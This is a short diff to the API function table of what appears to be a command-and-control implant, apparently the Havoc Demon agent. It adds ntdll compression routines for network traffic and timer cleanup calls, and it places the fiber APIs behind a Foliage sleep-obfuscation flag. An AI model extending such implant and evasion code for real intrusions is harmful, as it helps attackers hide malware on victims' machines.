@@ -175,13 +175,21 @@ typedef struct
         WIN_FUNC( RtlExitUserProcess )
         WIN_FUNC( RtlCreateTimer )
         WIN_FUNC( RtlRegisterWait )
+        WIN_FUNC( RtlDeregisterWaitEx )
         WIN_FUNC( RtlQueueWorkItem )
         WIN_FUNC( RtlCreateTimerQueue )
         WIN_FUNC( RtlDeleteTimerQueue )
+        WIN_FUNC( RtlDeleteTimerQueueEx )
         WIN_FUNC( RtlCaptureContext );
         WIN_FUNC( RtlAddVectoredExceptionHandler );
         WIN_FUNC( RtlRemoveVectoredExceptionHandler );
         WIN_FUNC( RtlCopyMappedMemory );
+
+        /* [HVC-007 2026-03-28] LZNT1 compression via ntdll. See TrafficImprovements.md §7.
+         * Explicit typedefs are used because Native.h does not declare these functions. */
+        NTSTATUS ( WINAPI *RtlGetCompressionWorkSpaceSize )( USHORT FormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize );
+        NTSTATUS ( WINAPI *RtlCompressBuffer            )( USHORT FormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace );
+        NTSTATUS ( WINAPI *RtlDecompressBuffer          )( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize );
 
         WIN_FUNC( NtClose );
         WIN_FUNC( NtSetEvent );
@@ -325,11 +333,13 @@ typedef struct
         WIN_FUNC( GetSidSubAuthorityCount )
         WIN_FUNC( GetSidSubAuthority)
 
+#ifdef SLEEPOBF_USE_FOLIAGE
         WIN_FUNC( ConvertThreadToFiberEx )
         WIN_FUNC( ConvertFiberToThread )
         WIN_FUNC( SwitchToFiber )
         WIN_FUNC( CreateFiberEx )
         WIN_FUNC( DeleteFiber )
+#endif
 
         // Token Management
         WIN_FUNC( RevertToSelf )
